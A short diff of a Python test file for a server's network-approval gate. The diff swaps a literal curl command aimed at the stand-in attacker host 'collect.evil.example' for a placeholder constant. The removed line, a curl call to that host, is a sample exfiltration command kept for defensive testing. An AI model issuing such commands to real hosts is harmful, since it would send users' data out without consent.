@@ -18,9 +18,9 @@ import pytest
 
 from server.db.models import ApprovalEvent, ScheduledTask
 from server.services import approvals, net_policy, permission_store, progress
-from tests.server.test_net_a_gate import REFUSED, _after_outside_content, _Asker, _Exec
+from tests.server.test_net_a_gate import REFUSED, UNSPELLED, _after_outside_content, _Asker, _Exec
 
-CURL = "curl -s https://collect.evil.example/in"
+CURL = UNSPELLED                       # NET-b: no URL's host, so the card comes after the run (the gate's pre-flight)
 SITE = "network:collect.evil.example"
 
 
